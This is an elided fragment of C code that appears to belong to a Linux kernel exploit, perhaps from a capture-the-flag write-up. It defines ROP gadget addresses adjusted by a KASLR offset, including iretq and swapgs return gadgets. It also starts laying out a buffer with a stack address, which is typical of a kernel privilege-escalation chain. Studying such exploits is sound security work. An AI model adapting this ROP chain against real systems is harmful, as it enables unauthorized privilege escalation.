...
#define MAGIC_GADGET 0xffffffff8138e238 // mov rdi, rax ; cmp rcx, rsi ; ja 0xffffffff8138e229 ; ret
...
int main() {
    ...
    size_t magic_gadget = kaslr_offset + 0xffffffff8138e238; // mov rdi, rax ; cmp rcx, rsi ; ja 0xffffffff8138e229 ; ret
    ...
    size_t iretq_ret = kaslr_offset + 0xffffffff81021762;
    size_t swapgs_popfq_ret = kaslr_offset + 0xffffffff81a00d5a;

    for (int i = 0; i < 0x200; i++) {
        buf[i] = 0;
    }
    *(size_t*)(buf+0x100) = stack_base - 0x80;
